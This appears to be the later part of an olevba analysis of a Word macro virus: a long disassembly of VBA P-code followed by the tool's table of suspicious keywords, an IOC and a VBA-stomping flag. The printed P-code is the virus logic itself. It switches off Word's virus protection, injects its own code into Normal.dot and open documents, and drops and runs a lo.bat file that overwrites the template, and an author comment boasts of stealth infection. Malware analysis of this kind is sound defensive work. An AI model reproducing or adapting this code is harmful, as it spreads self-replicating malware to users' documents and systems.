' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #154:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #155:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	LitDI2 0x0001 
' 	St i 
' Line #159:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #160:
' 	Label notemp 
' Line #161:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #162:
' 	CloseAll 
' Line #163:
' 	Label look2 
' Line #164:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St a 
' Line #165:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoDocL 
' 	EndIf 
' Line #166:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #167:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #168:
' 	Ld inn2 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #169:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #170:
' 	LitDI2 0x0001 
' 	St iact 
' Line #171:
' 	LitDI2 0x0014 
' 	St i 
' Line #172:
' 	ExitFor 
' Line #173:
' 	EndIfBlock 
' Line #174:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #175:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #176:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #177:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #178:
' 	Label noactsave 
' Line #179:
' 	ElseBlock 
' Line #180:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	Ld innt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld iact 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #184:
' 	Ld innt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #185:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set inff 
' Line #186:
' 	Ld inn 
' 	St component 
' Line #187:
' 	Ld FullCodeN 
' 	St FullCode 
' Line #188:
' 	LitDI2 0x0001 
' 	St InstSys 
' Line #189:
' 	ElseBlock 
' Line #190:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set inff 
' Line #191:
' 	Ld inn2 
' 	St component 
' Line #192:
' 	Ld FullCodeD 
' 	St FullCode 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	Label onceAgain 
' Line #195:
' 	Ld FullCode 
' 	Paren 
' 	Ld component 
' 	Ld inff 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #196:
' 	Ld iact 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #197:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set inff 
' Line #198:
' 	Ld inn2 
' 	St component 
' Line #199:
' 	Ld FullCodeD 
' 	St FullCode 
' Line #200:
' 	LitDI2 0x0000 
' 	St iact 
' Line #201:
' 	GoTo onceAgain 
' Line #202:
' 	EndIfBlock 
' Line #203:
' 	EndIfBlock 
' Line #204:
' 	Label NoDocL 
' Line #205:
' 	ElseBlock 
' Line #206:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #207:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #208:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #209:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St al 
' Line #210:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #211:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt SaveNormalPrompt 
' Line #214:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #215:
' 	EndSub 
' Line #216:
' 	FuncDefn (Sub Flitnic())
' Line #217:
' 	Label Begin 
' Line #218:
' 	OnError eb 
' Line #219:
' 	SetStmt 
' 	Ld Options 
' 	Set opttt 
' Line #220:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set nmtmpl 
' Line #221:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set actdoche 
' Line #222:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #223:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	Ld VBE 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #224:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #225:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #226:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt VirusProtection 
' Line #227:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt ConfirmConversions 
' Line #228:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt SaveNormalPrompt 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #230:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #231:
' 	OnError NoInf 
' Line #232:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #233:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #234:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ls 
' Line #235:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #236:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.4"
' 	Eq 
' 	IfBlock 
' Line #237:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #238:
' 	ExitFor 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #241:
' 	LitStr 0x0000 ""
' 	St l 
' Line #242:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #243:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #244:
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #245:
' 	Ld FullCodeN 
' 	LitDI2 0x0002 
' 	Ld a 
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St FullCodeN 
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #248:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #249:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ls 
' Line #250:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #251:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.4"
' 	Eq 
' 	IfBlock 
' Line #252:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #253:
' 	ExitFor 
' Line #254:
' 	EndIfBlock 
' Line #255:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #256:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #257:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #258:
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #259:
' 	Ld FullCodeD 
' 	LitDI2 0x0002 
' 	Ld a 
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St FullCodeD 
' Line #260:
' 	EndIfBlock 
' Line #261:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #262:
' 	Label look 
' Line #263:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #264:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #265:
' 	Ld inn 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #266:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #267:
' 	LitDI2 0x0001 
' 	St innt 
' Line #268:
' 	LitDI2 0x0014 
' 	St i 
' Line #269:
' 	ExitFor 
' Line #270:
' 	EndIfBlock 
' Line #271:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #272:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #273:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #274:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #275:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #276:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #277:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #278:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #279:
' 	CloseAll 
' Line #280:
' 	LitStr 0x0001 "n"
' 	St InsertC 
' Line #281:
' 	LitStr 0x000C "c:\temp2.dat"
' 	ArgsLd Dir 0x0001 
' 	St mmm 
' Line #282:
' 	Ld mmm 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\temp2.dat"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #283:
' 	CloseAll 
' Line #284:
' 	LitStr 0x000C "c:\temp2.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #285:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld InsertC 
' 	PrintItemNL 
' Line #286:
' 	CloseAll 
' Line #287:
' 	ArgsCall (Call) ViewVbCode 0x0000 
' Line #288:
' 	CloseAll 
' Line #289:
' 	LitStr 0x000C "c:\temp2.dat"
' 	ArgsCall Kill 0x0001 
' Line #290:
' 	GoTo look 
' Line #291:
' 	EndIfBlock 
' Line #292:
' 	EndIfBlock 
' Line #293:
' 	LitDI2 0x0001 
' 	St i 
' Line #294:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #295:
' 	CloseAll 
' Line #296:
' 	Label look2 
' Line #297:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #298:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #299:
' 	Ld inn2 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #300:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #301:
' 	LitDI2 0x0001 
' 	St iact 
' Line #302:
' 	LitDI2 0x0014 
' 	St i 
' Line #303:
' 	ExitFor 
' Line #304:
' 	EndIfBlock 
' Line #305:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #306:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #307:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #308:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #309:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #310:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #311:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #312:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #313:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #314:
' 	LitStr 0x0002 "nn"
' 	St InsertC 
' Line #315:
' 	LitStr 0x000C "c:\temp2.dat"
' 	ArgsLd Dir 0x0001 
' 	St mmm 
' Line #316:
' 	Ld mmm 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\temp2.dat"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #317:
' 	CloseAll 
' Line #318:
' 	LitStr 0x000C "c:\temp2.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #319:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld InsertC 
' 	PrintItemNL 
' Line #320:
' 	CloseAll 
' Line #321:
' 	ArgsCall (Call) ViewVbCode 0x0000 
' Line #322:
' 	CloseAll 
' Line #323:
' 	LitStr 0x000C "c:\temp2.dat"
' 	ArgsCall Kill 0x0001 
' Line #324:
' 	GoTo look2 
' Line #325:
' 	EndIfBlock 
' Line #326:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #327:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #328:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #329:
' 	Label noactsave 
' Line #330:
' 	ElseBlock 
' Line #331:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #332:
' 	EndIfBlock 
' Line #333:
' 	EndIfBlock 
' Line #334:
' 	Ld innt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld iact 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #335:
' 	Ld innt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #336:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set inff 
' Line #337:
' 	Ld inn 
' 	St component 
' Line #338:
' 	Ld FullCodeN 
' 	St FullCode 
' Line #339:
' 	LitDI2 0x0001 
' 	St InstSys 
' Line #340:
' 	ElseBlock 
' Line #341:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set inff 
' Line #342:
' 	Ld inn2 
' 	St component 
' Line #343:
' 	Ld FullCodeD 
' 	St FullCode 
' Line #344:
' 	EndIfBlock 
' Line #345:
' 	Ld FullCode 
' 	Paren 
' 	Ld component 
' 	Ld inff 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #346:
' 	Ld InstSys 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #347:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #348:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #349:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #350:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAtt 
' Line #351:
' 	LitStr 0x0000 ""
' 	St l 
' Line #352:
' 	OnError eb 
' Line #353:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #354:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #355:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #356:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #357:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #358:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #359:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #360:
' 	CloseAll 
' Line #361:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #362:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #363:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #364:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #365:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x01F4 
' 	For 
' Line #366:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "rem Flitnic has cought you... he, he"
' 	PrintItemNL 
' Line #367:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #368:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #369:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Move /y "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #370:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "If exist c:\Troop.dat goto Begin"
' 	PrintItemNL 
' Line #371:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #372:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #373:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #374:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #375:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #376:
' 	EndIfBlock 
' Line #377:
' 	Label notemp 
' Line #378:
' 	EndIfBlock 
' Line #379:
' 	EndIfBlock 
' Line #380:
' 	Label NoInf 
' Line #381:
' 	Label eb 
' Line #382:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #383:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #384:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #385:
' 	GoTo NoNormal 
' Line #386:
' 	EndIfBlock 
' Line #387:
' 	Ld NormAtt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #388:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #389:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #390:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #391:
' 	ElseBlock 
' Line #392:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #393:
' 	EndIfBlock 
' Line #394:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #395:
' 	QuoteRem 0x0000 0x0049 "The only real- stealth virus till 08. april 1999. Infects Normal.Dot when"
' Line #396:
' 	QuoteRem 0x0000 0x0042 "it's ReadOnly too (immediatly, the first time you load an infected"
' Line #397:
' 	QuoteRem 0x0000 0x0008 "Document"
' Line #398:
' 	QuoteRem 0x0000 0x003E "Written by Flitnic, member of [S o S] No Payload included yet!"
' Line #399:
' 	Label NoNormal 
' Line #400:
' 	EndSub 
' Line #401:
' Line #402:
' Line #403:
' Line #404:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

